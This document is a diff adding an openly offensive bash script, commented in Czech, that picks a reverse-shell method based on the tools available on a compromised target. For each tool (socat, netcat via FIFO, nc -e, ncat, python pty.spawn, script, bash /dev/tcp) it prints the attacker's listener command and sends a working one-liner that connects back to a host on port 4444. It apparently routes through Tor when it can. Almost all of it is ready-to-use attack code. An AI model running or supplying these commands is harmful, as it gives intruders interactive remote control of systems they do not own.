@@ -1,0 +1,109 @@
+#!/bin/bash
+
+TARGET_IP=$(_get_ip_via_tor_or_direct)
+TARGET_PORT="4444"
+
+print_std "Checking available tools on the target..."
+
+# 1. Nejprve zkontroluj socat (nejlepší volba)
+if remote_has_cmd "socat"; then
+    print_std "Found socat – best option."
+    print_std "On your machine, run:"
+    print_std "socat file:\`tty\`,raw,echo=0 tcp-listen:$TARGET_PORT"
+    print_std "Then press ENTER"
+    read
+    send_cmd "socat exec:/bin/bash,pty,stderr,setsid,sigint,sane tcp:$TARGET_IP:$TARGET_PORT"
+    return 0
+fi
+
+# 2. Zkontroluj netcat s podporou reverse shellu
+if remote_has_cmd "nc" && remote_has_cmd "mkfifo"; then
+    print_std "Found netcat with FIFO support – good option."
+    print_std "On your machine, run:"
+    print_std "nc -lvnp $TARGET_PORT"
+    print_std "Then press ENTER"
+    read
+    send_cmd "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $TARGET_IP $TARGET_PORT >/tmp/f"
+    return 0
+fi
+
+# 3. Zkontroluj netcat s /dev/tcp podporou (bash)
+if remote_has_cmd "nc" && remote_has_cmd "bash"; then
+    print_std "Found netcat with bash /dev/tcp – alternative option."
+    print_std "On your machine, run:"
+    print_std "nc -lvnp $TARGET_PORT"
+    print_std "Then press ENTER"
+    read
+    send_cmd "nc $TARGET_IP $TARGET_PORT -e /bin/bash 2>/dev/null || /bin/bash -i >&/dev/tcp/$TARGET_IP/$TARGET_PORT 0>&1"
+    return 0
+fi
+
+# 4. Zkontroluj moderní netcat (ncat)
+if remote_has_cmd "ncat"; then
+    print_std "Found ncat – good option."
+    print_std "On your machine, run:"
+    print_std "nc -lvnp $TARGET_PORT"
+    print_std "Then press ENTER"
+    read
+    send_cmd "ncat $TARGET_IP $TARGET_PORT -e /bin/bash"
+    return 0
+fi
+
+# 5. Zkontroluj netcat bez speciálních voleb (fallback)
+if remote_has_cmd "nc"; then
+    print_std "Found basic netcat – using FIFO method."
+    print_std "On your machine, run:"
+    print_std "nc -lvnp $TARGET_PORT"
+    print_std "Then press ENTER"
+    read
+    send_cmd "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $TARGET_IP $TARGET_PORT >/tmp/f; rm -f /tmp/f"
+    return 0
+fi
+
+# 6. Python3
+if remote_has_cmd "python3"; then
+    print_std "Found python3 – using PTY spawn."
+    print_std "On your machine, run:"
+    print_std "nc -lvnp $TARGET_PORT"
+    print_std "Then press ENTER"
+    read
+    send_cmd "python3 -c 'import socket,subprocess,os,pty; s=socket.socket(); s.connect((\"'$TARGET_IP'\",'$TARGET_PORT')); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/bash\")'"
+    return 0
+fi
+
+# 7. Python
+if remote_has_cmd "python"; then
+    print_std "Found python – using PTY spawn."
+    print_std "On your machine, run:"
+    print_std "nc -lvnp $TARGET_PORT"
+    print_std "Then press ENTER"
+    read
+    send_cmd "python -c 'import socket,subprocess,os,pty; s=socket.socket(); s.connect((\"'$TARGET_IP'\",'$TARGET_PORT')); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/bash\")'"
+    return 0
+fi
+
+# 8. Script utility
+if remote_has_cmd "script"; then
+    print_warn "Found 'script' utility – fallback option."
+    print_std "On your machine, run:"
+    print_std "nc -lvnp $TARGET_PORT"
+    print_std "Then press ENTER"
+    read
+    send_cmd "script -qc /bin/bash /dev/null </dev/tcp/$TARGET_IP/$TARGET_PORT >/dev/null"
+    return 0
+fi
+
+# 9. Pouze bash
+if remote_has_cmd "bash"; then
+    print_warn "Could not find socat, nc, python or script."
+    print_std "On your machine, run:"
+    print_std "nc -lvnp $TARGET_PORT"
+    print_std "Then press ENTER"
+    read
+    send_cmd "/bin/bash -i >&/dev/tcp/$TARGET_IP/$TARGET_PORT 0>&1"
+    return 0
+fi
+
+print_err "Could not find socat, nc, python, script or bash."
+print_err "Aborting..."
+return 1
